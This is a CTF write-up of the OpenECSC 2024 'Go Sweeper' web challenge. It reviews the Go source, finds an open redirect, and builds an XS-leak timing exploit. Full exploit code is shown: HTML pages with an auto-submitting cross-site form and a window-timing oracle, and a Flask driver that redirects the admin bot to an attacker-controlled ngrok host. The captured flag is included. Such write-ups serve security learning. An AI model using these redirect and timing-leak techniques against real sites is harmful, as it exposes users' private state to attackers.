---
title: 'OpenECSC 2024 - Round 2'
challenge: 'Go Sweeper'
date: 2024-04-30T23:59:00+01:00
author: 'v0lp3'
description: 'Writeup for the OpenECSC 2024 - Round 2 CTF challenge "Go Sweeper"' 
cover: '/img/openECSC/logo.png'
tags: ['web', 'open redirect', 'xsleak']
draft: false
---

{{< figure src="/img/openECSC/go_sweeper/play.png" position="left" caption="Go Sweeper" captionPosition="left">}}

**tl;dr**
- Go Sweeper is a web service developed in Go using the [go-chi](https://pkg.go.dev/github.com/go-chi/chi/v5) framework.
- The challenge implements the minesweeper game.
- The web service has an open redirect vulnerability.
- A middleware is used to add a set of security-enhancing headers, as detailed in the [OWASP HTTP Headers Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.htm).
- The solution involves an XS leak. By exploiting a side channel, an oracle can be created to identify when a card is a bomb.

## Code review

The challenge provides us with the source code of the application. As evident from the _main.go_ file, the service implements several routes:

{{< code language="go" title="Part of the main function" id="1" expand="Show" collapse="Hide" isCollapsed="false" >}}
    r.Get("/", homeHandler)
    r.Get("/register", registerHandler)
    r.Get("/login", loginGetHandler)
    r.Post("/login", loginPostHandler)
    r.Get("/board", authMiddleware(boardHandler))
    r.Get("/newboard", authMiddleware(newBoardHandler))
    r.Get("/checkwin", authMiddleware(checkWinHandler))
    r.Get("/clone", authMiddleware(cloneBoardHandler))
    r.Post("/checkboard", authMiddleware(checkBoardHandler))
    r.Post("/guess", authMiddleware(submitGuessHandler))
{{< /code >}}

As observed in the code, all functions are wrapped by the `authMiddleware`, except for: `/`, `/register`, and `/login`. This middleware essentially triggers a redirect to the login page.

{{< code language="go" title="authMiddleware function" id="2" expand="Show" collapse="Hide" isCollapsed="false" >}}
func authMiddleware(next http.HandlerFunc) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        s, err := sessionStore.Get(r, "session")
        if err != nil {
            http.Error(w, "Internal Server Error", http.StatusInternalServerError)
            return
        }
        
        // Check if user is authenticated
        if _, ok := s.Values["userid"].(string); !ok {
            // Redirect to login
            http.Redirect(w, r, "/login?redirect="+r.URL.Path, http.StatusFound)
            return
        }
        
        // Call the next handler
        next.ServeHTTP(w, r)
    }
}
{{< /code >}}

Here's the gist: the application leverages two middleware.

{{< code language="go" title="Part of the main function" id="3" expand="Show" collapse="Hide" isCollapsed="false" >}}
    r.Use(securityHeadersMiddleware)
    r.Use(redirectMiddleware)
{{< /code >}}


The query parameter `redirect` is included to redirect the user back to the route they were trying to access before logging in.

{{< code language="go" title="redirectMiddleware function" id="4" expand="Show" collapse="Hide" isCollapsed="false" >}}
func redirectMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        urlto := r.URL.Query().Get("redirect")

        if urlto != "" {
            // check if the user is authenticated
            s, err := sessionStore.Get(r, "session")
            
            if err != nil {
                next.ServeHTTP(w, r)
                return
            }

            userid, ok := s.Values["userid"].(string)

            if !ok || userid == "" {
                next.ServeHTTP(w, r)
                return
            }

            a, err := url.Parse(urlto)
            
            if err == nil {
                // accept only http and https or relative url
                fmt.Println("Scheme: ", a.Scheme)
                fmt.Println("Host: ", a.Host)
                fmt.Println("HOST CHALL: ", r.Host)

                if a.Scheme != "" && a.Scheme != "http" && a.Scheme != "https" {
                    http.Error(w, "URL parameter is invalid", http.StatusBadRequest)
                    return
                }
               
                // only accept same host
                if a.Scheme != "" && a.Host != r.Host {
                    http.Error(w, "URL parameter is invalid", http.StatusBadRequest)
                    return
                }
            }

            if err != nil {
                log.Println(err)
            }

            http.Redirect(w, r, urlto, http.StatusFound)
            return
        }
        next.ServeHTTP(w, r)
    })
}
{{< /code >}}

In this code, there is some logic to manage the redirect. The aim is to permit redirects only to the same origin or to a specific route within the same origin. However, these checks are insufficient and lead to a common vulnerability known as [open redirect](https://book.hacktricks.xyz/pentesting-web/open-redirect). For instance, if we input something like: `//naslabsec.it`, the redirect will take us to `https://naslabsec.it`. Other attempted payloads, such as `//javascript:alert(1)`, aimed at triggering an XSS on the page, do not succeed.

Returning to the challenge, this service implements the Minesweeper game. The objective is to win 20 consecutive boards. After achieving this, by visiting the `/` route, we will obtain the flag.

{{< code language="go" title="homeHandler function, route /" id="5" expand="Show" collapse="Hide" isCollapsed="false" >}}
func homeHandler(w http.ResponseWriter, r *http.Request) {
    userid, points, tries, err := getUserAndPoints(r)
    
    if err != nil {
        log.Println(err)
        // Clear session cookie
        s, _ := sessionStore.Get(r, "session")
        s.Options.MaxAge = -1
        s.Save(r, w)

        http.Error(w, "Something is wrong, please retry", http.StatusInternalServerError)
        return
    }

    flag := ""
    if points >= 20 && points == tries {
        flag = FLAG
    }

    data := struct {
        Userid string
        Points int
        Tries  int
        Flag   string
    }{
        Userid: userid,
        Points: points,
        Tries:  tries,
        Flag:   flag,
    }

    renderTemplate(w, "home.html", data)
}
{{< /code >}}

If we lose even once, we have to start over and win 20 consecutive games again. It's nearly impossible without cheating, lol.

In each board, during game, we have the option to request an "Admin check" of the board (don't ask me why). In this service, the admin can view the uncovered board using the "xray function" which allows them to see where the bombs are. The function at the route `/checkboard` triggers a bot in the backend that clones your board (up to 5 times) and visits `/board?xray=1`.

{{< code language="go" title="checkBoardHandler function, route /checkboard" id="6" expand="Show" collapse="Hide" isCollapsed="false" >}}
func checkBoardHandler(w http.ResponseWriter, r *http.Request) {
    // Create a new user for the bot
    id := make([]byte, 16)
    _, err := rand.Read(id)

    if err != nil {
        log.Println(err)
        http.Error(w, "Internal Server Error", http.StatusInternalServerError)
        return
    }

    botUserId := fmt.Sprintf("%x", id)

    // Insert user into the database
    _, err = db.Exec("INSERT INTO users (id, admin) VALUES (?, 1)", botUserId)

    if err != nil {
        log.Println(err)
        http.Error(w, "Internal Server Error", http.StatusInternalServerError)
        return
    }

    err = r.ParseForm()

    if err != nil {
        log.Println(err)
        http.Error(w, "Internal Server Error", http.StatusInternalServerError)
        return
    }

    cloneid := r.PostFormValue("cloneid")

    if cloneid == "" {
        s, err := sessionStore.Get(r, "session")
        
        if err != nil {
            log.Println(err)
            http.Error(w, "Internal Server Error", http.StatusInternalServerError)
            return
        }
  
        cloneid, _ = s.Values["userid"].(string)

        if cloneid == "" {
            http.Error(w, "Bad Request", http.StatusBadRequest)
            return
        }
    }

    // Call the bot
    data := struct {
        Actions []interface{} `json:"actions"`
        Browser string        `json:"browser"`
    }{
        Actions: []interface{}{
            map[string]string{
                "type": "request",
                "url":  CHALL_URL + "/login",
            },
            map[string]string{
                "type":    "type",
                "element": "#userid",
                "value":   botUserId,
            },
            map[string]string{
                "type":    "click",
                "element": "#submitbtn",
            },
            map[string]interface{}{
                "type": "sleep",
                "time": 1,
            },
            map[string]string{
                "type": "request",
                "url":  CHALL_URL + "/clone?cloneid=" + cloneid,
            },
            map[string]interface{}{
                "type": "sleep",
                "time": 1,
            },
            map[string]string{
                "type": "request",
                "url":  CHALL_URL + "/board?xray=1",
            },
            map[string]interface{}{
                "type": "sleep",
                "time": 4,
            },
        },
        Browser: "chrome",
    }

    dataJson, err := json.Marshal(data)

    if err != nil {
        log.Println(err)
        http.Error(w, "Internal Server Error", http.StatusInternalServerError)
        return
    }
[...]

}
{{< /code >}}

In this code, it's worth noting that if the `cloneid` is not provided, the requester user's ID will be used by default.

Revisiting the previous vulnerability, we can exploit the open redirect here to redirect the bot wherever we want. For instance, we can make a POST request to `/checkboard` with the form data `cloneid=&redirect=//naslabsec.it`, and the bot will be redirected to `https://naslabsec.it`.
## Exploit

From the previous section, we've established that we can redirect the bot wherever we want, but it's unclear what we can accomplish with this capability. One possibility is to attempt to steal the cookie of the admin bot, but since there isn't any XSS vulnerability in the service with or without the open redirect, we need to find another way.

Apart from that, the other middleware we mentioned earlier but haven't explored yet is `securityHeadersMiddleware`:

{{< code language="go" title="securityHeadersMiddleware function" id="7" expand="Show" collapse="Hide" isCollapsed="false" >}}
func securityHeadersMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        // https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html
        w.Header().Set("X-Frame-Options", "DENY")
        w.Header().Set("X-XSS-Protection", "0")
        w.Header().Set("X-Content-Type-Options", "nosniff")
        w.Header().Set("Referrer-Policy", "strict-origin-when-cross-origin")
        w.Header().Set("Content-Type", "text/html; charset=UTF-8")
        w.Header().Set("Strict-Transport-Security", "max-age=63072000; includeSubDomains; preload")
        w.Header().Set("Cross-Origin-Opener-Policy", "same-origin")
        w.Header().Set("Cross-Origin-Embedder-Policy", "require-corp")
        w.Header().Set("Cross-Origin-Resource-Policy", "same-site")
        w.Header().Set("Permissions-Policy", "geolocation=(), camera=(), microphone=()")
        
        next.ServeHTTP(w, r)
    })

}
{{< /code >}}

This raises the difficulty of the challenge because certain elements like iframes and frames are blocked, and the other headers restrict cross-origin actions. For instance, if we redirect the bot to _[https://naslabsec.it/pwn](https://naslabsec.it/pwn)_ and attempt to make a GET/POST request to _[https://gosweeper.challs.open.ecsc2024.it/board](https://gosweeper.challs.open.ecsc2024.it/board)_, the browser will block it.

The solution here lies in leveraging [XsLeak](https://xsleaks.dev/) techniques, where we need to construct a side channel to obtain a leak from the bot. In reality, there isn't much more we can do, as the `Cross-Origin-Opener-Policy` header enhances isolation. For example, if we open a cross-origin window from https://naslabsec.it to [https://gosweeper.challs.open.ecsc2024.it/board](https://gosweeper.challs.open.ecsc2024.it/board), so most XsLeaks techniques can't be applied.

The technique to transform the bot into an oracle here begins with the observation that the loading times of the `/board` route increase after hitting a bomb. We can verify this behavior with the following code:

{{< code language="go" title="submitGuessHandler function" id="8" expand="Show" collapse="Hide" isCollapsed="false" >}}
// Check if the guess is a bomb
    if board[guess] == 100 {
        // Update points and delete the board
        _, err := db.Exec(`UPDATE users SET tries = tries + 1, board = "", explored_board = "" WHERE id = ?;`, userid)

        if err != nil {
            log.Println(err)
            http.Error(w, "Internal Server Error", http.StatusInternalServerError)
            return
        }

        fmt.Fprintf(w, "100")
        return
{{< /code >}}

When a bomb is hit, the board is deleted. What happens when the user no longer has a board?

{{< code language="go" title="boardHandler function, route /board" id="9" expand="Show" collapse="Hide" isCollapsed="false" >}}
    if boardJson == "" {
        http.Redirect(w, r, "/newboard", http.StatusFound)
        return
    }
{{< /code >}}

If the user doesn't have a board, we are redirected to the handler that generates one and updates our profile.

So, if we send a guess that isn't a bomb, the loading time of the `/board` route is:

{{< figure src="/img/openECSC/go_sweeper/not_hit.png" position="left" caption="Loading time of /board?xray=1 (as admin), correct guess" captionPosition="left">}}

If the guess isn't incorrect, the board is deleted and the loading time is:

{{< figure src="/img/openECSC/go_sweeper/hit.png" position="left" caption="Loading time of /board?xray=1 (as admin), bomb hit" captionPosition="left">}}

So, if we can manipulate the bot to make a POST request to `/guess`, we can create side channels that reveal when there is a bomb behind a card without losing the game!
This XS leak is documented [here](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks).

Previously, we noted that the `Cross-Origin-Resource-Policy` restricts our ability to make requests. However, this restriction only applies to JavaScript. In the code, there isn't a policy set for the cookie. Therefore, in practice, the browser will enforce this policy as Lax after 2 minutes from its creation, as stated here:

> Chrome still has exceptions for those cookies without the attribute `SameSite` set _less than 2 minutes ago_, allowing that they are sent under `POST` top-level cross-site requests. This option, known as `Lax + POST`, will be disabled in a future soon, though there is not a date set for this yet.
> (https://www.premiumleads.com/en/blog/dev/samesite-cookies-why-some-cookies-have-stopped-working/)

This implies that we can utilize auto-submitting forms to implement our side channel.

Here is the exploit:

{{< code language="html" title="pwn.html" id="10" expand="Show" collapse="Hide" isCollapsed="false" >}}
<html>
<script>
    const URL = "https://gosweeper.challs.open.ecsc2024.it"
    const id = "c444ba1b1bdaaf883151c13afca7bf1a"
    const to_guess = 3
    
    window.open(URL + "/clone?cloneid=" + id);
    window.open("/?guess=" + to_guess);
	
	</script>	
</html>
{{< /code >}}


{{< code language="html" title="index.html" id="11" expand="Show" collapse="Hide" isCollapsed="false" >}}
<html>
		<body>
			<form
			method="POST"
			action="https://gosweeper.challs.open.ecsc2024.it/guess"
			id="form"
			target="popup">

			<input type="hidden" name="guess" id="to_guess" value="7" />
			<input type="submit" value="submit" />
		  </form>

</body>

<script>
	
	const urlParams = new URLSearchParams(window.location.search);
	let guess = urlParams.get('guess');
	
	if (guess == undefined) {
		guess = 0
	}

	document.getElementById("to_guess").value = guess;

		var limit = 600;

		var b = window.open("about:blank", "popup", "width=300, height=300");
		document.forms["form"].submit();
		
		setTimeout(() => {
			var t = performance.now();
		var a = window.open("https://gosweeper.challs.open.ecsc2024.it/board?xray=1", "", "width=300, height=300");
	
	
		function measure(){			
				try{
					a.origin;
					
					setTimeout(() => {
						measure();
					}, 0);
					
				}catch(e){
	
					var time = performance.now() - t;
					let is_bomb = false;
					
					if (time > limit) {
						is_bomb = true;
					}
					
					console.log("is_bomb", is_bomb)
					fetch("/naslab?is_bomb="+is_bomb + "&guess=" + guess)

					if (is_bomb == false && guess < 48) {
						document.location.href = "/?guess=" + (parseInt(guess) + 1) + "&time=" + time
					}
				}
			}
	
		measure()
		}, 100)
		
	</script>
</html>
{{< /code >}}

The strategy is:
- Redirect the bot to _pwn.html_ through the *checkboard* function.
- Once _pwn.html_ is visited, it will open automatically two new windows: one to the `/clone` route of the service to clone our board (so the bot now has the same board as us), and the other to the exploit _index.html_.
- The _index.html_ exploit will contain an auto-submitting form to the `/guess` route of the service, providing the position of the card we want to reveal.
- _index.html_ will open another window to the `/board?xray=1` route of the service and measure the loading times. Through experimentation, we know that if the loading time is greater than `600ms`, the guess was a bomb.
- index.html_ will send a request to our route `/naslab`, which will inform us if the guess was a bomb.

Note that if you have a bad board, you can visit the `/newboard` route in the service to get a new board without losing the streak. A board can be cloned up to 5 times, so we can reveal the position of only 5 bombs per game.

{{< code language="python" title="Flask server for serve the exploit and get the leak from the bot" id="12" expand="Show" collapse="Hide" isCollapsed="false" >}}
import requests
import logging

from flask import Flask, request, render_template, render_template_string

app = Flask(__name__)

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

GREEN = "\x1b[32m"
RED = "\x1b[31m"

@app.route('/pwn', methods=['GET'])
def pwn():
    # need to reload every time pwn.html
    with open("templates/pwn.html", "r") as t:
        template = t.read()

    return render_template_string(template)

@app.route('/', methods=['GET'])
def index():
    return render_template("index.html")

@app.route('/naslab', methods=['GET'])
def home():
    arguments = request.args
    is_bomb = arguments.get("is_bomb", "")

    if is_bomb == "false":
        color = GREEN
    else:
        color = RED

    guess = arguments.get("guess", "")

    print(color, f"CASELLA {guess}", "\x1b[0m")
    
    return "ok"

if __name__ == '__main__':
    userid = "c444[...]"
    cookie = "MTcxN[...]"


    while True:
        to_guess = input("Value to guess: ")
        with open('pwn.html.template', "r") as t:

            template = t.read().replace("{guess}", to_guess).replace("{userid}", userid)

        with open("templates/pwn.html", "w") as t:
            t.write(template)

        headers = {"Cookie": f"session={cookie}"}

        requests.post("https://gosweeper.challs.open.ecsc2024.it/checkboard", data={"cloneid":"&redirect=//3013-87-21-109-73.ngrok-free.app/pwn"}, headers=headers)

        try:
            print("[*] Started Oracle")
            app.run(port=5000)
        except KeyboardInterrupt:
            print("[*] Closing oracle")
{{< /code >}}

## Side notes

Well, during the competition, I found myself unable to get the flag of this challenge. Winning the game proved to be quite the Herculean task, even with the cheat at my disposal. Unfortunately, time slipped away as I toiled away on developing the exploit. However, once the competition concluded, I had no choice but to call upon the expertise of @SimozB, the renowned master pwner of Prato Fiorito (minesweeper). Remarkably, he effortlessly tackled all 20 boards in a mere 3 hours...

To master this challenge, the champion used this script to simplify things by pasting it into the browser console in the board page:

{{< code language="javascript" title="Script for the /board page" id="13" expand="Show" collapse="Hide" isCollapsed="false" >}}
document.addEventListener('keydown', function(event) {
  if (event.key === 'r') {
    document.location = "/newboard"
  }
});

var i = 0

var divs = document.querySelectorAll('.card');

for (var j = 0; j < divs.length; j++) {
    var el = document.createElement('p');
    el.innerText = i
    divs[i].appendChild(el);

    i += 1;
}
{{< /code >}}

Essentially, it's a method to quickly identify the number on the card at a glance:

{{< figure src="/img/openECSC/go_sweeper/no_mod.png" position="left" caption="Board page before injecting the script" captionPosition="left">}}


{{< figure src="/img/openECSC/go_sweeper/mod.png" position="left" caption="Board page after injecting the script" captionPosition="left">}}

Plus, if you hit the 'r' key, you can generate a new board. By overriding the page in the web browser, you can ensure these scripts remain active even after reloading.

{{< figure src="/img/openECSC/go_sweeper/win.png" position="left" caption="Home after winning 20 consecutive boards" captionPosition="left">}}

> openECSC{st0p_l3ak1ng_pl34se_1c9832ea}